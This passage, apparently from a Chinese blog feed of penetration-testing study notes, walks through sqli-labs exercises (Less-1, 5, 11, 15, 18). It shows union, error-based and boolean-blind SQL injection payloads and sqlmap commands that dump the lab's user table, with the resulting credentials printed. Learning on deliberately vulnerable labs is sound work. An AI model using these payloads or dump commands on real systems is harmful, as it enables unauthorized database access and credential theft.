name="MrWWa"></a></p><h3 id="爆破字段"><a href="#爆破字段" class="headerlink" title="爆破字段"></a>爆破字段</h3><p><code>1',1, updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1)) -- +</code> <a name="uA05n"></a></p><h1 id="sqlmap进行头部注入"><a href="#sqlmap进行头部注入" class="headerlink" title="sqlmap进行头部注入"></a>sqlmap进行头部注入</h1><blockquote><p>在头部注入爆破中，sqlmap需要提高扫描等级 level和risk<br>level x(x为1-5)<br>2时会对头部的<strong>cookie</strong>进行扫描注入尝试，<br>x&gt;=3时对<strong>user-Agent</strong>,<strong>ip</strong>,<strong>referer</strong> 参数进行扫描</p><p>risk x(x 1-3)<br>1时进行大部分扫描<br>2会增加基于事件的测试语句<br>3会增加or语句的sql注入</p></blockquote><p><a name="pqNBo"></a></p><h1 id="检测注入点"><a href="#检测注入点" class="headerlink" title="检测注入点"></a>检测注入点</h1><p><code>sqlmap -u "http://192.168.31.193/Less-18/ " --data="passwd=admin&amp;uname=admin" --batch --level 3 </code> <a name="t2ABA"></a></p><h1 id="爆破数据库名"><a href="#爆破数据库名" class="headerlink" title="爆破数据库名"></a>爆破数据库名</h1><p><code>sqlmap -u "http://192.168.31.193/Less-18/ " --data="passwd=admin&amp;uname=admin" --batch --level 3 --current-db</code> <a name="bdXmy"></a></p><h1 id="爆破数据表名"><a href="#爆破数据表名" class="headerlink" title="爆破数据表名"></a>爆破数据表名</h1><p><code>sqlmap -u "http://192.168.31.193/Less-18/ " --data="passwd=admin&amp;uname=admin" --batch --level 3 -D "security" --tables</code> <a name="Dm6EO"></a></p><h1 id="爆破字段内容"><a href="#爆破字段内容" class="headerlink" title="爆破字段内容"></a>爆破字段内容</h1><p><code>sqlmap -u "http://192.168.31.193/Less-18/ " --data="passwd=admin&amp;uname=admin" --batch --level 3 -D "security" -T "users" --dump</code></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less15</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/less15/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/less15/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">@<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT username, password FROM users WHERE username='<span class="token variable">$uname</span>' and password='<span class="token variable">$passwd</span>' LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>用单引号’闭合<br><code>1'</code>显示红色的图片<br><code>admin' order by 2-- +</code>显示蓝色图片</p><p><code>admin' union select 1,2-- +</code>蓝色图片</p><p>正确的数据与错误数据页面回显的图片不一样，使用<strong>布尔盲注</strong>\ <a name="K8btv"></a></p><h1 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">判断数据库名称长度admin<span class="token string">' or length(database())=8--+显示蓝色图片，说明数据库长度为8逐一猜解数据库名称admin'</span> or ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span>,1,1<span class="token punctuation">))</span><span class="token operator">=</span><span class="token number">115</span>--+第一个字符是s  <span class="token punctuation">..</span>.猜解数据表名称admin<span class="token string">' or ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;101 --+第一个字符是e ...猜解字段名称admin'</span> or ascii<span class="token punctuation">(</span>mid<span class="token variable"><span class="token punctuation">((</span>select group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> from information_schema.columns where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> and table_name<span class="token operator">=</span>'users'<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">))</span></span><span class="token operator">=</span><span class="token number">105</span>--+第一个字符是i <span class="token punctuation">..</span>.猜解字段内容admin' or ascii<span class="token punctuation">(</span>mid<span class="token variable"><span class="token punctuation">((</span>select group_concat<span class="token punctuation">(</span>username<span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span> from users<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">))</span></span><span class="token operator">=</span><span class="token number">68</span>--+第一个字符是D <span class="token punctuation">..</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a name="ytLRo"></a></p><h1 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">探测注入点sqlmap <span class="token parameter variable">-u</span> http://192.168.31.193/Less-15/ <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">"uname=admin&amp;passwd=admin"</span> <span class="token parameter variable">--batch</span>爆破数据库名sqlmap <span class="token parameter variable">-u</span> http://192.168.31.193/Less-15/ <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">"uname=admin&amp;passwd=admin"</span> <span class="token parameter variable">--batch</span> --current-db爆破数据表sqlmap <span class="token parameter variable">-u</span> http://192.168.31.193/Less-15/ <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">"uname=admin&amp;passwd=admin"</span> <span class="token parameter variable">--batch</span> <span class="token parameter variable">-D</span> security <span class="token parameter variable">--tables</span> 最后脱库sqlmap <span class="token parameter variable">-u</span> http://192.168.31.193/Less-15/ <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">"uname=admin&amp;passwd=admin"</span> <span class="token parameter variable">--batch</span> <span class="token parameter variable">-D</span> security <span class="token parameter variable">-T</span> <span class="token function">users</span> <span class="token parameter variable">--dump</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less11</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/less11/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/less11/</url>
      
        <content type="html"><![CDATA[<p><img src="/../../assets/ivhbtp8cseozy69t/1668574343567-9abdcb38-18af-4797-98c2-2073d26d484d.png" alt="image.png"><br>发现是一个登录页面<br><code>1'</code>单引号闭合<br>使用万能密码。<br>username输入<code>admin' or 1-- +</code>成功登录. <a name="VnzYl"></a></p><h1 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h1><p><a name="tFdi3"></a></p><h2 id="查询字段数"><a href="#查询字段数" class="headerlink" title="查询字段数"></a>查询字段数</h2><p><code>1' order by 3-- +</code></p><blockquote><p>登录后页面报错Unknown column ‘3’ in ‘order clause’</p></blockquote><p><code>1' order by 2-- +</code><br>没有提示错误，说明有2个字段；</p><p><a name="CeMCs"></a></p><h2 id="判断回显点"><a href="#判断回显点" class="headerlink" title="判断回显点"></a>判断回显点</h2><p><code>1' union select 1,2 #</code><br>显示1，2。判断出页面有两个显示位；</p><p><a name="ECWHT"></a></p><h2 id="爆数据库名"><a href="#爆数据库名" class="headerlink" title="爆数据库名"></a>爆数据库名</h2><p><code>1' union select 1,group_concat(schema_name) from information_schema.schemata #</code></p><blockquote><p>Your Login name:1<br>Your Password:information_schema,challenges,dvwa_com,mysql,performance_schema,security,sql,sys</p></blockquote><p><a name="FvGKE"></a></p><h2 id="爆数据表名"><a href="#爆数据表名" class="headerlink" title="爆数据表名"></a>爆数据表名</h2><p><code>1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #</code></p><blockquote><p>Your Login name:1<br>Your Password:emails,referers,uagents,users</p></blockquote><p><a name="cr7p8"></a></p><h2 id="爆字段名"><a href="#爆字段名" class="headerlink" title="爆字段名"></a>爆字段名</h2><p><code>1' union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users' #</code></p><blockquote><p>Your Login name:1<br>Your Password:id,username,password</p></blockquote><p><a name="yyein"></a></p><h2 id="爆字段内容"><a href="#爆字段内容" class="headerlink" title="爆字段内容"></a>爆字段内容</h2><p><code>1' union select 1,(select group_concat(username,'^',password)from users) #</code></p><blockquote><p>Your Login name:1<br>Your Password:Dumb^Dumb,<br>Angelina^I-kill-you,<br>Dummy^p@ssword,<br>secure^crappy,<br>stupid^stupidity,<br>superman^genious,<br>batman^mob!le,<br>admin^admin,<br>admin1^admin1,<br>admin2^admin2,<br>admin3^admin3,<br>dhakkan^dumbo,<br>admin4^admin4</p></blockquote><p><a name="wCZkA"></a></p><h1 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">启动sqlmap探测注入点sqlmap <span class="token parameter variable">-u</span> <span class="token function">ip</span> <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">"uname=admin&amp;passwd=admin"</span> <span class="token parameter variable">--batch</span>爆破当前数据库名sqlmap <span class="token parameter variable">-u</span> <span class="token function">ip</span> <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">"uname=admin&amp;passwd=admin"</span> <span class="token parameter variable">--batch</span> --current-db爆破数据表sqlmap <span class="token parameter variable">-u</span> <span class="token function">ip</span> <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">"uname=admin&amp;passwd=admin"</span> <span class="token parameter variable">--batch</span> <span class="token parameter variable">-D</span> security <span class="token parameter variable">--tables</span>最后脱库sqlmap <span class="token parameter variable">-u</span> <span class="token function">ip</span> <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">"uname=admin&amp;passwd=admin"</span> <span class="token parameter variable">--batch</span> <span class="token parameter variable">-D</span> security <span class="token parameter variable">-T</span> <span class="token function">users</span> <span class="token parameter variable">--dump</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a name="ngc5z"></a></p><h2 id="或者将抓包内容保存到-txt文件中"><a href="#或者将抓包内容保存到-txt文件中" class="headerlink" title="或者将抓包内容保存到.txt文件中"></a>或者将抓包内容保存到.txt文件中</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap.py <span class="token parameter variable">-r</span> <span class="token number">1</span>.txt <span class="token parameter variable">-p</span> <span class="token string">'uname'</span> <span class="token parameter variable">--batch</span>爆破数据库sqlmap.py <span class="token parameter variable">-r</span> <span class="token number">1</span>.txt <span class="token parameter variable">-p</span> <span class="token string">'uname'</span> <span class="token parameter variable">--batch</span> --current-db爆破表sqlmap.py <span class="token parameter variable">-r</span> <span class="token number">1</span>.txt <span class="token parameter variable">-p</span> <span class="token string">'uname'</span> <span class="token parameter variable">--batch</span> <span class="token parameter variable">-D</span> security <span class="token parameter variable">--tables</span>脱库sqlmap.py <span class="token parameter variable">-r</span> <span class="token number">1</span>.txt <span class="token parameter variable">-p</span> <span class="token string">'uname'</span> <span class="token parameter variable">--batch</span> <span class="token parameter variable">-D</span> security <span class="token parameter variable">--dump</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>lees5</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/lees5/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/lees5/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id='<span class="token variable">$id</span>' LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>?id=1'</code>有报错</p><blockquote><p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’ LIMIT 0,1’ at line 1</p></blockquote><p><strong>用’闭合</strong><br><code>?id=1' order by 4--+</code>提示第4列不存在<br><code>?id=1' order by 3--+</code> 发现没有了用户和ID的回显，只有”You are ing..”,</p><p><code>?id=1' union select 1,2,3--+</code>也只显示”You are ing..”，没有显示回显点。<br><code>?id=1'and 1=2--+</code>没有回显条件为假的错误。</p><p>条件正确有回显，条件错误没有回显；<br>有报错回显， 采取报错注入的方法， <a name="QcX1G"></a></p><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><p><strong>报错注入</strong>的运用前提是需要有数据库错误的显示</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">print_r<span class="token punctuation">(</span>mysql_error<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">;</span>是能够使用报错的前提。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>报错常用的三个函数，<strong>extractvalue()</strong>,<strong>updatexml(),floor()</strong>,还有**exp() **</p><p><a name="tKncj"></a></p><h1 id="用extractvalue函数进行报错注入"><a href="#用extractvalue函数进行报错注入" class="headerlink" title="用extractvalue函数进行报错注入"></a>用extractvalue函数进行报错注入</h1><p>extractvalue(1,1) <a name="FbE6V"></a></p><h2 id="查看数据库名称"><a href="#查看数据库名称" class="headerlink" title="查看数据库名称"></a>查看数据库名称</h2><p><code>?id=1' and extractvalue(1,concat(0x7e,database(),0x7e))--+</code><br>或<br><code>?id=1' or extractvalue(1,concat(0x7e,(select database()),0x7e))--+</code></p><blockquote><p>显示XPATH syntax error: ‘<del>security</del>‘<br>XPATH语法错误：“<del>security</del>”</p></blockquote><p><a name="FheLm"></a></p><h2 id="查看数据表名称"><a href="#查看数据表名称" class="headerlink" title="查看数据表名称"></a>查看数据表名称</h2><p><code>?id=1' or extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))--+</code></p><blockquote><p>显示XPATH syntax error: ‘<del>emails,referers,uagents,users</del>‘<br>XPATH语法错误：’<del>emails，referers，uagents，users</del>‘</p></blockquote><p><a name="pidlo"></a></p><h2 id="查看字段名称"><a href="#查看字段名称" class="headerlink" title="查看字段名称"></a>查看字段名称</h2><p><code>?id=1' or extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'),0x7e))--+</code></p><blockquote><p>显示XPATH syntax error: ‘<strong>~user_id,first_name,last_name,us</strong>‘<br>group_concat()函数<strong>可能放不下所有内容</strong>，可以采用<strong>截取</strong>或者<strong>limit函数</strong>读取</p></blockquote><p>可以看出，爆出的字段名称长度超出了32，所以需要使用substring（）函数每隔32位截取一次，最终拼凑出全部内容。<br>?id=1’ or extractvalue(1,concat(0x7e,substring((select group_concat(column_name) from information_schema.columns where table_name=’users’ ),1,31),0x7e))–+</p><blockquote><p>XPATH syntax error: ‘~user_id,first_name,last_name,us’</p></blockquote><p><code>?id=1' or extractvalue(1,concat(0x7e,substring((select group_concat(column_name) from information_schema.columns where table_name='users' ),32,31),0x7e))--+</code></p><blockquote><p>XPATH syntax error: ‘~er,password,avatar,last_login,f’</p></blockquote><p><code>?id=1' or extractvalue(1,concat(0x7e,substring((select group_concat(column_name) from information_schema.columns where table_name='users' ),64,31),0x7e))--+</code></p><blockquote><p>XPATH syntax error: ‘~iled_login,USER,CURRENT_CONNECT’</p></blockquote><p><code>?id=1' or extractvalue(1,concat(0x7e,substring((select group_concat(column_name) from information_schema.columns where table_name='users' ),95,31),0x7e))--+</code></p><blockquote><p>XPATH syntax error: ‘~IONS,TOTAL_CONNECTIONS,id,usern’</p></blockquote><p><code>?id=1' or extractvalue(1,concat(0x7e,substring((select group_concat(column_name) from information_schema.columns where table_name='users' ),126,31),0x7e))--+</code></p><blockquote><p>XPATH syntax error: ‘<del>ame,password</del>‘</p></blockquote><p><strong>拼接：</strong><br>user_id,<br>first_name,<br>last_name,<br>user,<br>password,<br>avatar,<br>last_login,<br>filed_login,<br>USER,<br>CURRENT_CONNECT~IONS,<br>TOTAL_CONNECTIONS,<br>id,<br>username,<br>password <a name="g9URs"></a></p><h3 id="或者只查看当前数据库表字段名称："><a href="#或者只查看当前数据库表字段名称：" class="headerlink" title="或者只查看当前数据库表字段名称："></a>或者只查看当前数据库表字段名称：</h3><p><code>?id=1' or extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema=database()),0x7e))--+</code></p><blockquote><p>XPATH syntax error: ‘<del>id,username,password</del>‘</p></blockquote><p><a name="fpIUQ"></a></p><h2 id="查看字段内容"><a href="#查看字段内容" class="headerlink" title="查看字段内容"></a>查看字段内容</h2><p><code>?id=1' or extractvalue(1,concat(0x7e,substring((select group_concat(concat(username,'^',password)) from users),1,31),0x7e))--+</code></p><blockquote><p>XPATH syntax error: ‘~Dumb^Dumb,Angelina^I-kill-you,D’</p></blockquote><p><code>?id=1' or extractvalue(1,concat(0x7e,substring((select group_concat(concat(username,'^',password)) from users),32,31),0x7e))--+</code></p><blockquote><p>XPATH syntax error: ‘~ummy^p@ssword,secure^crappy,stu’</p></blockquote><p><code>?id=1' or extractvalue(1,concat(0x7e,substring((select group_concat(concat(username,'^',password)) from users),63,31),0x7e))--+</code></p><blockquote><p>XPATH syntax error: ‘~pid^stupidity,superman^genious,’</p></blockquote><p><code>?id=1' or extractvalue(1,concat(0x7e,substring((select group_concat(concat(username,'^',password)) from users),94,31),0x7e))--+</code></p><blockquote><p>XPATH syntax error: ‘~batman^mob!le,admin^admin,admin’</p></blockquote><p><code>?id=1' or extractvalue(1,concat(0x7e,substring((select group_concat(concat(username,'^',password)) from users),125,31),0x7e))--+</code></p><blockquote><p>XPATH syntax error: ‘~1^admin1,admin2^admin2,admin3^a’</p></blockquote><p><code>?id=1' or extractvalue(1,concat(0x7e,substring((select group_concat(concat(username,'^',password)) from users),156,31),0x7e))--+</code></p><blockquote><p>XPATH syntax error: ‘~dmin3,dhakkan^dumbo,admin4^admi’</p></blockquote><p><code>?id=1' or extractvalue(1,concat(0x7e,substring((select group_concat(concat(username,'^',password)) from users),187,31),0x7e))--+</code></p><blockquote><p>XPATH syntax error: ‘<del>n4</del>‘</p></blockquote><p>拼接用户^密码：<br>Dumb^Dumb,<br>Angelina^I-kill-you,<br>Dummy^p@ssword,<br>secure^crappy,<br>stupid^stupidity,<br>superman^genious,<br>batman^mob!le,<br>admin^admin,<br>admin1^admin1,<br>admin2^admin2,<br>admin3^admin3,<br>dhakkan^dumbo,<br>admin4^admin4</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>lees1</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/lees1/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/lees1/</url>
      
        <content type="html"><![CDATA[<p><a name="z3aMA"></a></p><h1 id="1-判断有无注入点"><a href="#1-判断有无注入点" class="headerlink" title="1.判断有无注入点"></a>1.判断有无注入点</h1><pre><code>$sql="SELECT * FROM users WHERE id='1' LIMIT 0,1";</code></pre><p>单引号闭合</p><p><code>?id=1'</code></p><blockquote><p>select * from users where id=’1’’ limit 0,1</p></blockquote><p>有报错说明有注入点</p><p><a name="lh1Tf"></a></p><h1 id="2-猜解列名数量"><a href="#2-猜解列名数量" class="headerlink" title="2.猜解列名数量"></a>2.猜解列名数量</h1><p><a name="JHoY5"></a></p><h2 id="order-by"><a href="#order-by" class="headerlink" title="order by"></a><code>order by</code></h2><blockquote><p>%20表示为空格</p></blockquote><p><code>?id=1' order by 3 --+</code><br><code>?id=1' order by 4 --+</code></p><blockquote><p>select * from users where id=’1’ order by 3 –+’ limit 0,1</p></blockquote><p>字段 3个 <a name="sFNaN"></a></p><h1 id="3-报错，判断回显点"><a href="#3-报错，判断回显点" class="headerlink" title="3.报错，判断回显点"></a>3.报错，判断回显点</h1><p><a name="XqT1O"></a></p><h2 id="union"><a href="#union" class="headerlink" title="union"></a>union</h2><p><code>?id=-1' union select 1,2,3 --+</code></p><blockquote><p>select * from users where id=’-1’ union select 1,2,3 –+’ limit 0,1</p></blockquote><p>2,3是回显点 <a name="qHO7j"></a></p><h1 id="4-信息收集"><a href="#4-信息收集" class="headerlink" title="4.信息收集"></a>4.信息收集</h1><blockquote><p>database(): 数据库名称<br>version():数据库版本</p></blockquote><p><code>?id=-1' union select 1,database(),version()--+ </code></p><blockquote><p>select * from users where id=’-1’ union select 1,database(),version()–+’ limit 0,1</p></blockquote><blockquote><p><strong>Your Login name:security</strong><br><strong>Your Password:5.7.26</strong></p></blockquote><p>数据库名称：<strong>securit</strong><br>数据库版本：<strong>5.7.26</strong> <a name="xvLPE"></a></p><h1 id="5-使用对应SQL进行注入"><a href="#5-使用对应SQL进行注入" class="headerlink" title="5.使用对应SQL进行注入"></a>5.使用对应SQL进行注入</h1><blockquote><p>group_concat()函数可以让多个数据在一行显示</p></blockquote><p><a name="EVRXH"></a></p><h2 id="查看所有数据库名称"><a href="#查看所有数据库名称" class="headerlink" title="查看所有数据库名称"></a>查看所有数据库名称</h2><p><code>?id=-1' union select 1,2,group_concat(schema_name) from information_schema.schemata--+</code></p><blockquote><p>select * from users where id=’-1’ union select 1,2,group_concat(schema_name) from information_schema.schemata–+’ limit 0,1</p></blockquote><blockquote><p>Your Login name:2<br>Your Password:<strong>information_schema,challenges,dvwa_com,mysql,performance_schema,security,sql,sys</strong></p></blockquote><blockquote><p><strong>存在的数据库：</strong><br><strong>information_schema</strong><br><strong>challenges</strong><br><strong>dvwa_com</strong><br><strong>performance_schema</strong><br><strong>security</strong><br><strong>sql</strong><br><strong>sys</strong></p></blockquote><p><a name="eGmlZ"></a></p><h2 id="查看使用数据表名称"><a href="#查看使用数据表名称" class="headerlink" title="查看使用数据表名称"></a>查看使用数据表名称</h2><p><code>?id=-1' union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()--+  </code></p><blockquote><p>select * from users where id=’-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()–+’ limit 0,1</p></blockquote><blockquote><p>Your Login name:2<br>Your Password:<strong>emails,referers,uagents,users</strong></p></blockquote><blockquote><p><strong>表名</strong><br><strong>emails</strong><br><strong>referers</strong><br><strong>uagents</strong><br><strong>users</strong></p></blockquote><p><a name="MZSNh"></a></p><h2 id="查看字段名"><a href="#查看字段名" class="headerlink" title="查看字段名"></a>查看字段名</h2><p><code>?id=-1' union select 1,2,group_concat(column_name) from information_shema.columns where table_name='users'--+</code></p><blockquote><p>select * from users where id=’-1’ union select 1,2,group_concat(column_name) from information_shema.columns where table_name=’users’–+’ limit 0,1</p></blockquote><blockquote><p>Your Login name:2<br>Your Password:<strong>user_id,first_name,last_name,user,password,avatar,last_login,failed_login,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password</strong></p></blockquote><blockquote><p>users的字段名<br><strong>user_id</strong><br><strong>first_name</strong><br><strong>last_name</strong><br><strong>user</strong><br><strong>password</strong><br><strong>avatar</strong><br><strong>last_login</strong><br><strong>failed_login</strong><br><strong>USER</strong><br><strong>CURRENT_CONNECTIONS</strong><br><strong>TOTAL_CONNECTIONS</strong><br><strong>id</strong><br><strong>username</strong><br><strong>password</strong></p></blockquote><p><a name="nJvzj"></a></p><h2 id="查看字段"><a href="#查看字段" class="headerlink" title="查看字段"></a>查看字段</h2><p><code>id=-1' union select 1,2,(select group_concat(username,~,password)from users)--+</code></p><blockquote><p>select * from users where id=’<code>-1' union select 1,2,(select group_concat(username,0x7e,password)from users)--+</code>‘ limit 0,1</p></blockquote><p>0x7e:~</p><blockquote><p>Your Login name:2<br>Your Password:<strong>Dumb<del>Dumb,Angelina</del>I-kill-you,Dummy<del>p@ssword,secure</del>crappy,stupid<del>stupidity,superman</del>genious,batman<del>mob!le,admin</del>admin,admin1<del>admin1,admin2</del>admin2,admin3<del>admin3,dhakkan</del>dumbo,admin4~admin4</strong></p></blockquote><blockquote><p>用户<del>口令:<br>**Dumb</del>Dumb**<br><strong>Angelina~I-kill-you</strong><br><strong>Dummy~p@ssword</strong><br><strong>secure~crappy</strong><br><strong>stupid~stupidity</strong><br><strong>superman~genious</strong><br><strong>batman~mob!le</strong><br><strong>admin~admin</strong><br><strong>admin1~admin1</strong><br><strong>admin2~admin2</strong><br><strong>admin3~admin3</strong><br><strong>dhakkan~dumbo</strong><br><strong>admin4~admin4</strong></p></blockquote><br><a name="KKJFS"></a># sqlmap`sqlmap -u http://192.168.31.193/Less-1/?id=1 --batch`&gt; **--batch:跳过询问,代表全自动 不用我们手动输入y/n**&gt; **-u:ip地址**<pre><code>┌──(root㉿guoyx)-[/home/kali]└─# sqlmap -u http://192.168.31.193/Less-1/?id=1 --batch[22:05:28] [INFO] the back-end DBMS is MySQLweb application technology: PHP 5.3.29, Apache 2.4.39back-end DBMS: MySQL &gt;= 5.6</code></pre><p>PHP 5.3.29,<br>&amp;#x20;Apache 2.4.39<br>back-end DBMS: MySQL &gt;= 5.6 <a name="ZKiKa"></a></p><h2 id="查看当前数据库名称"><a href="#查看当前数据库名称" class="headerlink" title="查看当前数据库名称"></a>查看当前数据库名称</h2><p><code>sqlmap -u http://192.168.31.193/Less-1/?id=1 --batch --current-db</code></p><blockquote><p>--current-db:查看数据库名称</p></blockquote><pre><code>┌──(root㉿guoyx)-[/home/kali]└─# sqlmap -u http://192.168.31.193/Less-1/?id=1 --batch --current-db[22:11:23] [INFO] the back-end DBMS is MySQLweb application technology: Apache 2.4.39, PHP 5.3.29back-end DBMS: MySQL &gt;= 5.6[22:11:23] [INFO] fetching current databasecurrent database: 'security'[22:11:24] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.31.193'</code></pre><p>security <a name="tOsVp"></a></p><h2 id="查看数据表名称"><a href="#查看数据表名称" class="headerlink" title="查看数据表名称"></a>查看数据表名称</h2><p><code>sqlmap -u 192.168.31.193/Less-1/?id=1 --batch -D "security" --tables</code></p><blockquote><p>-D  ：指定数据库名称<br>--tables：查看数据表</p></blockquote><pre class="line-numbers language-none"><code class="language-none">sqlmap -u 192.168.31.193/Less-1/?id=1 --batch -D "security" --tablesDatabase: security[4 tables]+----------+| emails   || referers || uagents  || users    |+----------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>emails<br>referers<br>uagents<br>users <a name="rLD4A"></a></p><h2 id="查看字段名-1"><a href="#查看字段名-1" class="headerlink" title="查看字段名"></a>查看字段名</h2><p><code>sqlmap -u 192.168.31.193/Less-1/?id=1 --batch -D "security" -T "users" --columns</code></p><blockquote><p>-T “users” ：指定表名称<br>--columns：查看字段名</p></blockquote><pre class="line-numbers language-none"><code class="language-none">┌──(root㉿guoyx)-[/home/kali]└─# sqlmap -u 192.168.31.193/Less-1/?id=1 -D security -T users --columns[3 columns]+----------+-------------+| Column   | Type        |+----------+-------------+| id       | int(3)      || password | varchar(20) || username | varchar(20) |+----------+-------------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>id<br>password<br>username <a name="dvpUW"></a></p><h2 id="查看字段-1"><a href="#查看字段-1" class="headerlink" title="查看字段"></a>查看字段</h2><p><code>sqlmap -u 192.168.31.193/Less-1/?id=1 --batch -D "security" -T "users" -C id,password,username --dump</code></p><blockquote><p>-C id,password,username：指定要显示的列<br>--dump脱裤</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿guoyx<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali<span class="token punctuation">]</span>└─<span class="token comment"># sqlmap -u 192.168.31.193/Less-1/?id=1 --batch -D "security" -T "users" -C id,password,username --dump</span><span class="token punctuation">[</span><span class="token number">13</span> entries<span class="token punctuation">]</span>+----+------------+----------+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> password   <span class="token operator">|</span> username <span class="token operator">|</span>+----+------------+----------+<span class="token operator">|</span> <span class="token number">1</span>  <span class="token operator">|</span> Dumb       <span class="token operator">|</span> Dumb     <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">2</span>  <span class="token operator">|</span> I-kill-you <span class="token operator">|</span> Angelina <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">3</span>  <span class="token operator">|</span> p@ssword   <span class="token operator">|</span> Dummy    <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">4</span>  <span class="token operator">|</span> crappy     